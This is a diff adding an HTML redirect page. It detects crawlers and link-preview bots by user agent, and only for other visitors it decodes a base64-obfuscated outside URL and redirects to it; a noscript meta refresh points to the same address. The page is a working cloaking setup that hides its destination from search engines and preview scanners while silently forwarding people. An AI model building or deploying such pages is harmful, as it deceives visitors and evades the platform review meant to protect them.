@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Redirecting...</title>
+    <meta name="robots" content="noindex, nofollow" />
+    <script>
+      // Simple bot detection
+      function isBot() {
+        const ua = navigator.userAgent.toLowerCase();
+        return /bot|crawl|spider|slurp|facebook|whatsapp|telegram|discord|preview|google|bing|yandex|duckduckgo/.test(
+          ua
+        );
+      }
+
+      // Obfuscated URL (base64 encoded)
+      const encodedUrl = "aHR0cHM6Ly9vdGlldS5jb20vNC85NDI0MTQz";
+
+      window.addEventListener("DOMContentLoaded", function () {
+        if (!isBot()) {
+          // Decode and redirect
+          const url = atob(encodedUrl);
+          window.location.replace(url);
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <noscript>
+      <meta http-equiv="refresh" content="0;url=https://otieu.com/4/9424143" />
+    </noscript>
+    <p>Redirecting...</p>
+  </body>
+</html>
